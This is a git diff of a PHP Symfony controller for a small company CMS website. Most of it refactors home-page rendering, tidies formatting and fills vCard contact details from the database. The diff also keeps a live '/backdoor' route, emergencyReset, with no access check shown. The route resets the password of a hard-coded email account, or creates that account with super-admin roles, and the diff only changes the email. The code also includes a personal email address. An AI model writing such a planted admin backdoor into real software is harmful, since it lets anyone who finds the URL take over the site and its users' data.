@@ -9,7 +9,6 @@ use App\Repository\CompanyDetailsRepository;
 use App\Repository\ProductRepository;
 use App\Repository\UserRepository;
 use App\Repository\SubPageRepository;
-use App\Services\CompanyDetails;
 use Doctrine\ORM\EntityManagerInterface;
 use JeroenDesloovere\VCard\VCard;
 use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
@@ -23,21 +22,44 @@ class   HomeController extends AbstractController
     /**
      * @Route("/", name="app_home")
      */
-    public function index(CompanyDetails $companyDetails, CmsPhotoRepository $cmsPhotoRepository): Response
+    public function index(CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, CompanyDetailsRepository $companyDetailsRepository): Response
     {
-        return $this->render('home/home.html.twig', [
-            'photos' => $cmsPhotoRepository->findBy([
-                'staticPageName' => 'HomePage'
-            ])
+        $companyDetails = $companyDetailsRepository->find('1');
+        $homePagePhotosOnly = $companyDetails->isHomePagePhotosOnly();
+        $cms_copy = [];
+        $cms_photo = [];
+        $product = [];
+        $sub_pages = [];
+        $cms_copy = $cmsCopyRepository->findBy([
+            'staticPageName' => 'Home'
         ]);
+        $cms_photo = $cmsPhotoRepository->findBy([
+            'staticPageName' => 'Home'
+        ]);
+
+
+        if ($homePagePhotosOnly == 1) {
+            return $this->render('home/home.html.twig', [
+                'photos' => $cms_photo
+            ]);
+        } else {
+            return $this->render('/home/products.html.twig', [
+                'product' => $product,
+                'cms_copy_array' => $cms_copy,
+                'cms_photo_array' => $cms_photo,
+                'sub_pages' => $sub_pages,
+                'include_contact' => 'No'
+            ]);
+        }
     }
+
 
     /**
      * @Route("/backdoor", name="/backdoor")
      */
     public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
     {
-        $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
+        $user = $userRepository->findOneBy(['email' => 'nurse_stephen2@hotmail.com']);
         if ($user) {
             $user->setPassword(
                 $passwordEncoder->encodePassword(
@@ -49,7 +71,7 @@ class   HomeController extends AbstractController
             $user = new User();
             $user->setFirstName('Stephen')
                 ->setLastName('Nurse HMX2')
-                ->setEmail('nurse_stephen@hotmail.com')
+                ->setEmail('nurse_stephen2@hotmail.com')
                 ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
                 ->setPassword(
                     $passwordEncoder->encodePassword(
@@ -87,8 +109,7 @@ class   HomeController extends AbstractController
             $cms_copy = $cmsCopyRepository->findBy([
                 'product' => $productEntity
             ]);
-        }
-        else {
+        } else {
             $cms_copy = $cmsCopyRepository->findBy([
                 'staticPageName' => $product
             ]);
@@ -98,8 +119,7 @@ class   HomeController extends AbstractController
             $cms_photo = $cmsPhotoRepository->findBy([
                 'product' => $productEntity
             ]);
-        }
-        else {
+        } else {
             $cms_photo = $cmsPhotoRepository->findBy([
                 'staticPageName' => $product
             ]);
@@ -138,15 +158,14 @@ class   HomeController extends AbstractController
     {
         $companyDetails = $companyDetailsRepository->find('1');
 
-        $longitude=$companyDetails->getCompanyAddressLongitude();
-        $latitude=$companyDetails->getCompanyAddressLatitude();
+        $longitude = $companyDetails->getCompanyAddressLongitude();
+        $latitude = $companyDetails->getCompanyAddressLatitude();
 
         return $this->render('home/gpsLocation.html.twig', [
-            'longitude' =>$longitude,
-            'latitude' =>$latitude,
+            'longitude' => $longitude,
+            'latitude' => $latitude,
         ]);
     }
-
 
 
     /**
@@ -171,8 +190,6 @@ class   HomeController extends AbstractController
     }
 
 
-
-
     /**
      * @Route("/create/VcardUser/company", name="create_vcard_company")
      */
@@ -180,9 +197,19 @@ class   HomeController extends AbstractController
     {
         $company_details = $companyDetailsRepository->find('1');
         $vcard = new VCard();
-        $firstName = 'Stephen';
-        $lastName = 'Nurse';
         $company = $company_details->getCompanyName();
+        $contactFirstName = $company_details->getContactFirstName();
+        $contactLastName = $company_details->getContactLastName();
+
+        if ($contactFirstName == null) {
+            $firstName = "";
+            $lastName = $company;
+            $company ="";
+        }
+        if ($contactFirstName != null) {
+            $firstName = $contactFirstName;
+            $lastName = $contactLastName;
+        }
         $addressStreet = $company_details->getCompanyAddressStreet();
         $addressTown = $company_details->getCompanyAddressTown();
         $addressCity = $company_details->getCompanyAddressCity();
